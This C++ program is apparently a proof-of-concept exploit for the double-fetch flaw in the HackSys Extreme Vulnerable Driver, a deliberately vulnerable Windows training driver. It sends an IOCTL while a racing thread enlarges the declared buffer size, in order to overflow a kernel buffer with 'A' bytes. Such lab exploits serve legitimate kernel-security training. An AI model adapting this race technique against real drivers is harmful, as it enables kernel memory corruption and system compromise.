#include <iostream>
#include <Windows.h>
#define IOCTL_CODE 0x222037

typedef struct _DOUBLE_FETCH {
    PVOID Buffer;
    ULONG64 Size;
} DOUBLE_FETCH, * PDOUBLE_FETCH;
BYTE DriverArray[3000] = { 0 };
DOUBLE_FETCH DriverParams = { DriverArray, 2048 };  // First 2 attributes are already zero-ed out


HANDLE StartThread(PVOID ThreadAddress, PVOID ThreadParameters) {
    HANDLE CurrentThreadHandle = INVALID_HANDLE_VALUE;
    SECURITY_ATTRIBUTES ThreadAttributes = { 0 };
    ThreadAttributes.bInheritHandle = FALSE;
    ThreadAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
    ThreadAttributes.lpSecurityDescriptor = NULL;
    CurrentThreadHandle = CreateThread(&ThreadAttributes,
        0,
        (LPTHREAD_START_ROUTINE)ThreadAddress,
        ThreadParameters,
        0,
        NULL);

    return CurrentThreadHandle;
}

void ChangeValue(ULONG64* BufferSize) {
    if (BufferSize != NULL) {
        *BufferSize = 3000;
        printf("%llu\n", *BufferSize);
    }
}


int main() {
    for (int i = 0; i < sizeof(DriverArray); i++) {
        DriverArray[i] = 'A';
    }
    DWORD BytesReturned = 0;
    HANDLE ThreadHandle = INVALID_HANDLE_VALUE;
    HANDLE DriverHandle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_ALL, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) {
        printf("[-] DriverHandle = INVALID_HANDLE_VALUE\n");
        return FALSE;
    }
    ThreadHandle = StartThread(&ChangeValue, &DriverParams.Size);
    if (!DeviceIoControl(DriverHandle, IOCTL_CODE, &DriverParams, sizeof(DriverParams), NULL, NULL, &BytesReturned, NULL)) {
        printf("[-] Driver operation failed\n");
        CloseHandle(DriverHandle);
        return FALSE;
    }
    printf("[+] Driver operation succeeded\n");
    CloseHandle(DriverHandle);
    return TRUE;
}
